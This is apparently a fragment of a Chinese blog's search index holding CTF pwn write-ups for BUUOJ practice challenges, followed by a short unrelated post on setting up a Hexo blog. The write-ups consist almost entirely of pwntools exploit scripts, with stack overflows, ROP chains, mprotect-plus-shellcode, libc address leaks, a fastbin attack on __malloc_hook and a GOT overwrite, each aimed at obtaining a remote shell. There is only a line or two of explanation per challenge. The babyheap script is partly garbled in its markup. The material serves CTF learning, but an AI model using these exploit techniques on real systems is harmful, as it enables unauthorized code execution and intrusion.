href="#pwn1-sctf-2016" class="headerlink" title="pwn1_sctf_2016"></a>pwn1_sctf_2016</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#sh = process('./pwn1_sctf_2016')</span></span><br><span class="line">sh = remote (<span class="string">'pwn.buuoj.cn'</span>,<span class="number">20086</span>)</span><br><span class="line">payload = <span class="string">'I'</span>*<span class="number">19</span> + <span class="string">"a"</span> * <span class="number">7</span> + p32(<span class="number">0x08048F0D</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h3 id="not-the-same-3dsctf-2016"><a href="#not-the-same-3dsctf-2016" class="headerlink" title="not_the_same_3dsctf_2016"></a>not_the_same_3dsctf_2016</h3><p>这题，利用mrotect，修改了可执行区域</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#sh = process('./not_the_same_3dsctf_2016')</span></span><br><span class="line">sh = remote (<span class="string">'pwn.buuoj.cn'</span>,<span class="number">20007</span>)</span><br><span class="line">elf = ELF(<span class="string">'./not_the_same_3dsctf_2016'</span>)</span><br><span class="line"><span class="comment">#libc = ELF('x86_libc.so.6')</span></span><br><span class="line">pop2 = <span class="number">0x0806fcc9</span></span><br><span class="line">pop3 = <span class="number">0x0809e3e5</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x2D</span> + p32(elf.symbols[<span class="string">'mprotect'</span>]) </span><br><span class="line">payload += p32(pop3) + p32(<span class="number">0x080EB000</span>) + p32(<span class="number">0x3000</span>)</span><br><span class="line">payload += p32(<span class="number">7</span>) + p32(elf.symbols[<span class="string">'read'</span>]) </span><br><span class="line">payload += p32(pop3) + p32(<span class="number">0</span>) + p32(<span class="number">0x080EBF80</span>) + p32(<span class="number">0x200</span>) + p32(<span class="number">0x080EBF80</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">sh.sendline(asm(shellcraft.sh()))</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h3 id="get-started-3dsctf-2016"><a href="#get-started-3dsctf-2016" class="headerlink" title="get_started_3dsctf_2016"></a>get_started_3dsctf_2016</h3><p>这题的思路呢，和上面not_the_same_3dsctf_2016类似</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">"i386"</span></span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line"><span class="comment">#sh = process("./get_started_3dsctf_2016")</span></span><br><span class="line">sh = remote(<span class="string">"pwn.buuoj.cn"</span>,<span class="number">20004</span>)</span><br><span class="line">elf = ELF(<span class="string">"get_started_3dsctf_2016"</span>)</span><br><span class="line">pop2_ret = <span class="number">0x0809a7dc</span></span><br><span class="line">pop3_ret = <span class="number">0x0804f460</span></span><br><span class="line">payload = <span class="string">'a'</span> * <span class="number">56</span> + p32(elf.symbols[<span class="string">'mprotect'</span>]) + p32(pop3_ret) + p32(<span class="number">0x080EB000</span>) + p32(<span class="number">0x3000</span>) + p32(<span class="number">7</span>) + p32(elf.symbols[<span class="string">'read'</span>]) + p32(pop3_ret) + p32(<span class="number">0</span>) + p32(<span class="number">0x080EBF80</span>) + p32(<span class="number">0x200</span>) + p32(<span class="number">0x080EBF80</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"><span class="comment">#sleep(1)</span></span><br><span class="line"><span class="comment">#input()</span></span><br><span class="line">sh.sendline(asm(shellcraft.sh()))</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h3 id="ciscn-2019-n-1"><a href="#ciscn-2019-n-1" class="headerlink" title="ciscn_2019_n_1"></a>ciscn_2019_n_1</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">pop_rdi_ret = <span class="number">0x400793</span></span><br><span class="line">bss = <span class="number">0x0000000000601050</span></span><br><span class="line">elf = ELF(<span class="string">"ciscn_2019_n_1"</span>)</span><br><span class="line">sh = remote(<span class="string">'pwn.buuoj.cn'</span>,<span class="number">20137</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">56</span></span><br><span class="line">payload += p64(pop_rdi_ret)+p64(bss)+p64(elf.plt[<span class="string">'gets'</span>])</span><br><span class="line">payload += p64(pop_rdi_ret)+p64(bss)+p64(elf.plt[<span class="string">'system'</span>])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.send(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h3 id="ciscn-2019-en-2"><a href="#ciscn-2019-en-2" class="headerlink" title="ciscn_2019_en_2"></a>ciscn_2019_en_2</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#sh = process('./ciscn_2019_en_2')</span></span><br><span class="line">sh = remote (<span class="string">'pwn.buuoj.cn'</span>,<span class="number">20123</span>)</span><br><span class="line">elf = ELF(<span class="string">'ciscn_2019_en_2'</span>)</span><br><span class="line">libc = ELF(<span class="string">'./x64_libc.so.6'</span>)</span><br><span class="line">pop_rdi = <span class="number">0x0000000000400c83</span></span><br><span class="line">main_addr = <span class="number">0x0000000000400B28</span></span><br><span class="line"><span class="comment">################### leak ####################</span></span><br><span class="line">sh.sendlineafter(<span class="string">'!\n'</span>,<span class="string">'1'</span>)</span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x58</span></span><br><span class="line">payload += p64(pop_rdi) + p64(elf.got[<span class="string">'puts'</span>]) + p64(elf.plt[<span class="string">'puts'</span>]) + p64(main_addr)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.recvuntil(<span class="string">'\x0a'</span>)</span><br><span class="line">sh.recvuntil(<span class="string">'\x0a'</span>)</span><br><span class="line">sh.recvuntil(<span class="string">'\x0a'</span>)</span><br><span class="line">puts_addr = u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">log.success(<span class="string">'puts_addr='</span>+hex(puts_addr))</span><br><span class="line">libc_base = puts_addr - libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">binsh = libc_base + libc.search(<span class="string">'/bin/sh'</span>).next()</span><br><span class="line"><span class="comment">###################  shell  #############</span></span><br><span class="line">sh.sendlineafter(<span class="string">'!\n'</span>,<span class="string">'1'</span>)</span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x58</span></span><br><span class="line">payload += p64(pop_rdi) + p64(binsh) + p64(system_addr) </span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h3 id="ciscn-2019-c-1"><a href="#ciscn-2019-c-1" class="headerlink" title="ciscn_2019_c_1"></a>ciscn_2019_c_1</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#sh = process('./ciscn_2019_c_1')</span></span><br><span class="line">sh = remote (<span class="string">'pwn.buuoj.cn'</span>,<span class="number">20115</span>)</span><br><span class="line">elf = ELF(<span class="string">'./ciscn_2019_c_1'</span>)</span><br><span class="line"><span class="comment">#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')</span></span><br><span class="line">libc = ELF(<span class="string">"x64_libc.so.6"</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x0000000000400c83</span></span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">'!'</span>)</span><br><span class="line">sh.sendline(<span class="string">'1'</span>)</span><br><span class="line">sh.recvuntil(<span class="string">"Input your Plaintext to be encrypted\n"</span>)</span><br><span class="line">payload = <span class="string">'a'</span>*(<span class="number">0x50</span>+<span class="number">0x08</span>)</span><br><span class="line">payload += p64(pop_rdi) + p64(elf.got[<span class="string">'puts'</span>])+p64(elf.plt[<span class="string">'puts'</span>])+p64(elf.symbols[<span class="string">'main'</span>])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.recvuntil(<span class="string">'\n'</span>)</span><br><span class="line">sh.recvuntil(<span class="string">'\n'</span>)</span><br><span class="line">puts_addr = u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">'puts_addr='</span>+hex(puts_addr)</span><br><span class="line">libc_addr = puts_addr - libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">system = libc_addr + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">binsh = libc_addr + libc.search(<span class="string">"/bin/sh\x00"</span>).next()</span><br><span class="line">sh.sendline(<span class="string">"1"</span>)</span><br><span class="line">sh.recvuntil(<span class="string">"Input your Plaintext to be encrypted\n"</span>)</span><br><span class="line">payload  = <span class="string">"\x00"</span> * (<span class="number">0x50</span> + <span class="number">0x8</span>)</span><br><span class="line">payload += p64(pop_rdi) + p64(binsh) + p64(system)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h3 id="babyheap-0ctf-2017"><a href="#babyheap-0ctf-2017" class="headerlink" title="babyheap_0ctf_2017"></a>babyheap_0ctf_2017</h3><p>这题的漏洞点呢，主要在edit的size由你自己决定又因为delete进行了0操作，所以得通过fake，讲一个堆块的指针指到unsoted bin堆块的地方进行读取</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#sh = remote('pwn.buuoj.cn',20001)</span></span><br><span class="line">sh = process(<span class="string">'./babyheap_0ctf_2017'</span>)</span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line">elf = ELF(<span class="string">"babyheap_0ctf_2017"</span>)</span><br><span class="line">libc = ELF(<span class="string">"x64_libc.so.6"</span>)</span><br><span class="line"><span class="comment">#libc = ELF("libc-2.23.so")</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size)</span>:</span></span><br><span class="line">sh.recvuntil(<span class="string">"Command: "</span>)</span><br><span class="line">sh.sendline(<span class="string">"1"</span>)</span><br><span class="line">sh.recvuntil(<span class="string">"Size: "</span>)</span><br><span class="line">sh.sendline(str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,size,content)</span>:</span></span><br><span class="line">sh.recvuntil(<span class="string">"Command: "</span>)</span><br><span class="line">sh.sendline(<span class="string">"2"</span>)</span><br><span class="line">sh.recvuntil(<span class="string">"Index: "</span>)</span><br><span class="line">sh.sendline(str(idx))</span><br><span class="line">sh.recvuntil(<span class="string">"Size: "</span>)</span><br><span class="line">sh.sendline(str(size))</span><br><span class="line">sh.recvuntil(<span class="string">"Content: "</span>)</span><br><span class="line">sh.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">sh.recvuntil(<span class="string">"Command: "</span>)</span><br><span class="line">sh.sendline(<span class="string">"3"</span>)</span><br><span class="line">sh.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dump</span><span class="params">(idx)</span>:</span></span><br><span class="line">sh.recvuntil(<span class="string">"Command: "</span>)</span><br><span class="line">sh.sendline(<span class="string">"4"</span>)</span><br><span class="line">sh.recvuntil(<span class="string">"Index: "</span>)</span><br><span class="line">sh.sendline(str(idx))</span><br><span class="line"><span class="comment">############### leak libc_base + malloc_hook#########</span></span><br><span class="line">add(<span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">0x80</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x21</span>) + p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x21</span>) + p8(<span class="number">0x80</span>)</span><br><span class="line">edit(<span class="number">0</span>,len(payload),payload)</span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x21</span>)</span><br><span class="line">edit(<span class="number">3</span>,len(payload),payload)</span><br><span class="line">add(<span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">0x10</span>)</span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x91</span>)</span><br><span class="line">edit(<span class="number">3</span>,len(payload),payload)</span><br><span class="line">add(<span class="number">0x80</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">dump(<span class="number">2</span>)</span><br><span class="line">sh.recvuntil(<span class="string">"Content: \n"</span>)</span><br><span class="line">libc_base = u64(sh.recv(<span class="number">8</span>))<span class="number">-0x3c4b78</span></span><br><span class="line">malloc_hook = libc_base + libc.symbols[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">log.success(<span class="string">'libc_base='</span> + hex(libc_base))</span><br><span class="line">log.success(<span class="string">'malloc_hook ='</span> + hex (malloc_hook))</span><br><span class="line">gdb.attach(sh)</span><br><span class="line"><span class="comment">################## </span></span><br><span class="line">add(<span class="number">0x60</span>) <span class="comment">#malloc to malloc_hook nearby</span></span><br><span class="line">delete(<span class="number">4</span>) <span class="comment">#allocate a 0x70 size chunk same with malloc hook nearby chunk, idx4</span></span><br><span class="line"></span><br><span class="line">// edit idx4<span class="string">'s fd point to fake chunk</span></span><br><span class="line"><span class="string">payload = p64(malloc_hook - 35)</span></span><br><span class="line"><span class="string">edit(2,len(payload),payload)</span></span><br><span class="line"><span class="string">add(0x60)</span></span><br><span class="line"><span class="string">add(0x60)</span></span><br><span class="line"><span class="string">one_gadget = 0x4526a</span></span><br><span class="line"><span class="string">payload = p8(0) * 3 + p64(0) * 2 + p64(libc_base + one_gadget)</span></span><br><span class="line"><span class="string">edit(6,len(payload),payload)</span></span><br></pre></td></tr></table></figure><h3 id="babyfengshui-33c3-2016"><a href="#babyfengshui-33c3-2016" class="headerlink" title="babyfengshui_33c3_2016"></a>babyfengshui_33c3_2016</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="comment">#sh = process('./babyfengshui_33c3_2016')</span></span><br><span class="line">sh = remote(<span class="string">'pwn.buuoj.cn'</span>,<span class="number">20002</span>)</span><br><span class="line">elf = ELF(<span class="string">"babyfengshui_33c3_2016"</span>)</span><br><span class="line">libc = ELF(<span class="string">"x86_libc.so.6"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(name_size,name,text_size,text)</span>:</span></span><br><span class="line">sh.recvuntil(<span class="string">"Action: "</span>)</span><br><span class="line">sh.sendline(<span class="string">"0"</span>)</span><br><span class="line">sh.recvuntil(<span class="string">"size of description: "</span>)</span><br><span class="line">sh.sendline(str(name_size))</span><br><span class="line">sh.recvuntil(<span class="string">"name: "</span>)</span><br><span class="line">sh.sendline(name)</span><br><span class="line">sh.recvuntil(<span class="string">"text length: "</span>)</span><br><span class="line">sh.sendline(str(text_size))</span><br><span class="line">sh.recvuntil(<span class="string">"text:"</span>)</span><br><span class="line">sh.sendline(text)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">sh.recvuntil(<span class="string">"Action: "</span>)</span><br><span class="line">sh.sendline(<span class="string">"2"</span>)</span><br><span class="line">sh.recvuntil(<span class="string">"index: "</span>)</span><br><span class="line">sh.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,text,size)</span>:</span></span><br><span class="line">sh.recvuntil(<span class="string">"Action: "</span>)</span><br><span class="line">sh.sendline(<span class="string">"3"</span>)</span><br><span class="line">sh.recvuntil(<span class="string">"index: "</span>)</span><br><span class="line">sh.sendline(str(idx))</span><br><span class="line">sh.recvuntil(<span class="string">"text length: "</span>)</span><br><span class="line">sh.sendline(str(size))</span><br><span class="line">sh.recvuntil(<span class="string">"text: "</span>)</span><br><span class="line">sh.sendline(text)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">sh.recvuntil(<span class="string">"Action: "</span>)</span><br><span class="line">sh.sendline(<span class="string">"1"</span>)</span><br><span class="line">sh.recvuntil(<span class="string">"index: "</span>)</span><br><span class="line">sh.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">'\x11\n'</span>,<span class="number">0x80</span>,<span class="string">'\x12\n'</span>)<span class="comment">#idx 0 </span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">'\x13\n'</span>,<span class="number">0x10</span>,<span class="string">"\x14\n"</span>)</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">'\x15\x15'</span>,<span class="number">0x10</span>,<span class="string">'\x16\x16'</span>)</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">'/bin/sh\x00'</span>,<span class="number">0x10</span>,<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">'\x17\n'</span>,<span class="number">0x160</span>,<span class="number">0x128</span> * <span class="string">'a'</span> + p32(elf.got[<span class="string">'free'</span>]))</span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">sh.recvuntil(<span class="string">"description: "</span>)</span><br><span class="line">libc_base = u32(sh.recv(<span class="number">4</span>)) - libc.symbols[<span class="string">'free'</span>]</span><br><span class="line">system_addr = libc.symbols[<span class="string">'system'</span>] + libc_base</span><br><span class="line">log.success(<span class="string">"libc: "</span> + hex(libc_base))</span><br><span class="line">log.success(<span class="string">"system_addr:"</span> + hex(system_addr))</span><br><span class="line">edit(<span class="number">1</span>,p32(system_addr),<span class="number">0x4</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>搭建博客的一些坑</title>
      <link href="/2019/10/04/%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%E7%9A%84%E4%B8%80%E4%BA%9B%E5%9D%91/"/>
      <url>/2019/10/04/%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%E7%9A%84%E4%B8%80%E4%BA%9B%E5%9D%91/</url>
      
        <content type="html"><![CDATA[<p>根据此链接进行博客的搭建<a href="https://blog.csdn.net/weixin_39879178/article/details/80319392" target="_blank" rel="noopener">https://blog.csdn.net/weixin_39879178/article/details/80319392</a><br>但是其中踩了不少的坑，发现此链接中有些图片存在些许问题</p><p><strong>1.在进行hexo init的时候</strong><br><img src="https://img-blog.csdnimg.cn/20191003223041562.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3poel9fX18=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>实际上，你不应该在根目录进行hexo init操作，而是应该进入你的blog/Hexo文件里进行 hexo init操作。<br>不然，你就会出现hexo no found。</p><p><strong>2.在进行添加分类链接的时候</strong><br>网上很多博客都是直接让你new page一个categories，但是请注意！！！！！<br><img src="https://img-blog.csdnimg.cn/20191003223424930.png" alt="在这里插入图片描述"><br>先观察你的github文件夹里categories里的大小写，根据大小写来修改D:\blog\Hexo\themes\next里的_config.yml文件夹里的categories选项。</p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
